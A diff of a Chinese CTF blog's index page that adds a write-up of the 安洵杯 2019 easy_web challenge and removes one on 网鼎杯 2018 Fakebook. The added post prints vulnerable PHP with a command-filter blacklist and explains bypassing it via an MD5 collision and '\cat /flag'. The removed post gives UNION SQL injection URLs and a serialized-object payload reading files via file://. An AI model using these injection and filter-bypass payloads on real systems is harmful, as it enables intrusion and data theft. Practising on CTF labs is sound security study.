@@ -227,7 +227,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">78</span>
+          <span class="site-state-item-count">79</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -279,6 +279,115 @@
       
 
       
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/25/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/25/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-web/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-easy-web</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2020-09-25 10:14:31 / 修改时间：11:09:30" itemprop="dateCreated datePublished" datetime="2020-09-25T10:14:31+08:00">2020-09-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/09/25/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-web/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/25/BUUOJ%E5%88%B7%E9%A2%98-Web-easy-web/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>安洵杯 2019的easy_web。 上来就是Orange传世名篇（不是，注意URL，<code>http://01247d3a-afa6-47e3-8066-91d9c4cb599a.node3.buuoj.cn/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=</code>，cmd先不管是啥，img很有意思，两次Base64后再转字符串，得到555.png，那就试着读index.php，得到： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)$_POST[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure> 很明显，一个RCE。但是要先绕MD5，这个简单，Fastcoll 生成两个文件，Python requests直接提交就行。然后读flag。ls不让用，我们可以dir，发现在/有flag。没法用cat tail head less more等读文件。尝试用man /flag，没装man，这个时候怎么办呢？两种思路：一是继续找有没有其他的命令，这个时候一定要注意去找coreutils有没有神奇的命令，例如xxd sort uniq fmt tarcat paste tac base64 base32 base85等命令。二是用bash绕过。例如，cat /flag，正常ASCII字符前加转义<code>\\</code>，是没有用的。所以，<code>\cat /flag</code>一样可以。注意空格被过滤了，要用%20替换。不过requests自动编码，顺手绕过了。</p>
+
+    <div id="aplayer-TsGstNqE" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="2772113" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{742613ae-89e7-4cf2-8ee0-1136024a27b7}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1330,122 +1439,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Fakebook/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpeg">
-      <meta itemprop="name" content="Tiaonmmn.ZMZ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tiaonmmn's Littile House">
-    </span>
-
-    
-    
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/09/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Fakebook/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-Fakebook</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2020-09-02 11:29:03 / 修改时间：16:08:50" itemprop="dateCreated datePublished" datetime="2020-09-02T11:29:03+08:00">2020-09-02</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
-        </span>
-    </span>
-
-  
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/09/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Fakebook/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/02/BUUOJ%E5%88%B7%E9%A2%98-Web-Fakebook/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>3.1k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>3 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>2018网鼎杯的Fakebook。</p>
-<p>上来允许Login和Join，Join会让我们输入用户名、密码、年龄和博客，输入这个东西有点意思。不能以http开头，不能出现127.0.0.1，随便输入www.baidu.com，通过。然后我们可以通过view.php?no=1来得到详细信息，以及Blog的内容。SSRF没跑了。</p>
-<p>扫源码，发现有robots.txt，user.php.bak，下载得源码。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">    </span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>isValidBlog限制有点严，只允许http(s)协议，要想办法变成gopher或者file协议。</p>
-<p>注意到view.php?no=1，随手加个单引号，发现MySQL报错？<code>union select</code>被Ban，那就用注释绕过，然后手注。<code>http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,database(),3,4%23</code>，得到当前数据库为fakebook，<code>[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27%20limit%201),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select table_name from information_schema.tables where table_schema='fakebook' limit 1),3,4%23)</code>，当前表名为users，<code>[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=%27fakebook%27%20limit%201,1),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select column_name from information_schema.columns where table_schema='fakebook' limit 1,1),3,4%23)</code>，得到users表字段为：no、username、passwd、data。<code>[http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select%20data%20from%20users%20limit%200,1),3,4%23](http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(select data from users limit 0,1),3,4%23)</code>得到data的内容，返回<code>O:8:"UserInfo":3:&#123;s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:13:"www.baidu.com";&#125;</code>，反序列化串内容正好对应user.php.bak里的UserInfo类。</p>
-<p>那么，猜测一下view.php的逻辑，从数据库获取对应no的行，然后反序列化data，并显示到页面上去。那么，我们如果我们修改了反序列化串，就可以使得blog的地址不受isValidBlog()的限制。</p>
-<p>随手测一下flag.php，发现存在。那么file://读就可以了。构造反序列化串<code>O:8:"UserInfo":3:&#123;s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;</code>，然后访问<code>http://ed5ed7a6-40ea-48e7-9293-76d7ce6551b2.node3.buuoj.cn/view.php?no=-1/**/union/**/select/**/1,(2),3,'O:8:"UserInfo":3:&#123;s:4:"name";s:3:"123";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'%23</code>，即可得到flag.php内容。</p>
-
-    <div id="aplayer-pSwTjvPY" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="343502" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
-    ></div>
-<p>flag{5c18e6fa-598b-43f4-a7d7-719332e3d8af}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1502,14 +1495,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">328k</span>
+    <span title="站点总字数">330k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:58</span>
+    <span title="站点阅读时长">5:01</span>
   </span>
 </div>
 <div class="busuanzi-count">
